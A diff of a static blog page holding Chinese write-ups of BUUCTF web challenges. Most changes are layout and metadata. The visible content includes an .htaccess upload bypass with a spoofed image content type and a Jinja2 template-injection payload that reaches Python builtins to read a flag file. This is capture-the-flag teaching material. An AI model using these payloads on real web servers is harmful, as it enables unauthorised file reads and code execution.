@@ -18,9 +18,9 @@
   <meta name="keywords" content="Web,CTF,渗透测试">
   
     <meta name="description" content="[GXYCTF2019]BabyUpload上传 .htaccess ，同时修改content-type 为 image&#x2F;jpeg  &#x2F;upload&#x2F;b323290d2841ae288bfa9e1f60656229&#x2F;.htaccess  最后构建数据包如下 1234567891011121314151617181920212223242526POST &#x2F; H">
-<meta property="og:type" content="article">
+<meta property="og:type" content="website">
 <meta property="og:title" content="BUUCTF_web_第二页wp分享">
-<meta property="og:url" content="https://d3n13d.github.io/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/index.html">
+<meta property="og:url" content="https://d3n13d.github.io/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB.html">
 <meta property="og:site_name" content="D3n13d &#39;s blog">
 <meta property="og:description" content="[GXYCTF2019]BabyUpload上传 .htaccess ，同时修改content-type 为 image&#x2F;jpeg  &#x2F;upload&#x2F;b323290d2841ae288bfa9e1f60656229&#x2F;.htaccess  最后构建数据包如下 1234567891011121314151617181920212223242526POST &#x2F; H">
 <meta property="og:locale" content="zh_CN">
@@ -107,7 +107,7 @@
 
 
 <body>
-  <header style="height: 70vh;">
+  <header style="height: 60vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand" href="/">
@@ -215,7 +215,7 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('/img/bg/tree.jpg') no-repeat center center;
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -223,45 +223,6 @@
             <span class="h2" id="subtitle" title="BUUCTF_web_第二页wp分享">
               
             </span>
-
-            
-              <div class="mt-3">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-author" aria-hidden="true"></i>
-      D3n13d
-    </span>
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-18 23:16" pubdate>
-        2022年1月18日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      54k 字
-    </span>
-  
-
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      212 分钟
-    </span>
-  
-
-  
-  
-</div>
 
             
           </div>
@@ -274,20 +235,17 @@
 
   <main>
     
-      
+      <div class="container nopadding-x-md">
+        <div class="py-5" id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">BUUCTF_web_第二页wp分享</h1>
-            
-            <div class="markdown-body">
-              <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传 .htaccess ，同时修改content-type 为 image&#x2F;jpeg</p>
+<article class="page-content">
+  <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传 .htaccess ，同时修改content-type 为 image&#x2F;jpeg</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121403584.png" srcset="/img/loading.gif" lazyload alt="image-20220112140343471"></p>
 <p>&#x2F;upload&#x2F;b323290d2841ae288bfa9e1f60656229&#x2F;.htaccess </p>
 <p>最后构建数据包如下</p>
@@ -694,112 +652,15 @@
 
 <p>得到 flag 在 &#x2F;this_is_the_flag.txt</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="hljs-keyword">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/this_is_the_fl&#x27;</span>+<span class="hljs-string">&#x27;ag.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
-            </div>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
-                    
-                  </div>
-                
+
+  
+</article>
+
               </div>
-              <p class="note note-warning">
-                <strong>本文作者: </strong><a href="/">D3n13d</a> <br>
-                <strong>本文链接: </strong><a href="https://d3n13d.github.io/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/">https://d3n13d.github.io/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/</a> <br>
-                <strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
-                   </p>
-                   
-              
-                <div class="post-prevnext">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/01/28/BUUCTF-web-%E7%AC%AC%E4%B8%89%E9%A1%B5wp%E5%88%86%E4%BA%AB/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">BUUCTF_web_第三页wp分享</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/01/12/BUUCTF-web-%E7%AC%AC%E4%B8%80%E9%A1%B5wp%E5%88%86%E4%BA%AB/">
-                        <span class="hidden-mobile">BUUCTF_web_第一页wp分享</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
-
-            
-              <!-- Comments -->
-              <article class="comments" id="comments" lazyload>
-                
-                  
-                
-                
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'preferred-color-scheme';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'D3n13d/utterances');
-      s.setAttribute('issue-term', 'title');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
-
-
-              </article>
-            
-          </article>
+          </div>
         </div>
       </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
     
 
     
